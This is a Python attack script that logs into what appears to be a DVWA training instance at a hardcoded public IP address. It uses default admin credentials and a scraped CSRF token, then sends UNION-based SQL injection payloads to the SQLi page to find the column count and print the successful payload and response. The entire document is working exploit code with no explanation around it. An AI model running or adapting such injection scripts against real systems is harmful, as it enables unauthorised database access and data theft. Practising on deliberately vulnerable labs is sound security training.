
import requests
import re
from urllib.parse import quote

session = requests.Session()

# Get fresh token and login
resp = session.get("http://31.97.117.123/login.php")
match = re.search(r"user_token['\"] value=['\"](.*?)['\"]", resp.text)
token = match.group(1) if match else "574fcd28f93f57c93cb554ecaf3ca520"

# Login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

resp = session.post("http://31.97.117.123/login.php", data=login_data)

# Test to find the number of columns
for num_cols in range(1, 6):
    payload = f"1' UNION SELECT {','.join([str(i) for i in range(1, num_cols+1)])}-- -"
    resp = session.get(f"http://31.97.117.123/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")
    
    if "different number of columns" not in resp.text:
        print(f"SUCCESS! Found {num_cols} columns")
        print(f"Payload: {payload}")
        print("\nResponse snippet:")
        print(resp.text[2000:3500])
        break
    else:
        print(f"Tried {num_cols} columns - wrong number")

